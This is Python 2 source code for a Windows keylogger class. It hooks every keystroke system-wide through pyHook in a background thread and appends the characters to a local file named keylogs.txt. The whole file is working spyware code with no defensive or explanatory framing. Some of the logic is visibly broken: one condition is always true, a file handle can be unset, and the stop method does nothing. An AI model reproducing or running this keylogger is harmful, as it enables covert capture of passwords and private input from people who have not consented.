import win32api 
import sys
import pythoncom, pyHook
import thread


class keylogger:

    def OnKeyboardEvent(self,event):
        if event.Ascii == 5: 
            sys.exit() 
        if event.Ascii != 0 or 8: 
            f = open ('keylogs.txt', 'a') 
            keylogs = chr(event.Ascii) 
        if event.Ascii== 13: 
            keylogs = keylogs + '\n' 
        f.write(keylogs) 
        f.close() 


    def start(self,t):
        #print 'keylogger thread started...'
        while True:
            hm = pyHook.HookManager() 
            hm.KeyDown = self.OnKeyboardEvent 
            hm.HookKeyboard() 
            pythoncom.PumpMessages()
        

    def startKeylogger(self):

        #print 'debug'
        try:
            thread.start_new_thread( self.start, (1,  ) )
        except:
            print "Error: unable to start keylogger thread"


    def stopKeylogger(self):
        print 'stopping keylogger'
        




        
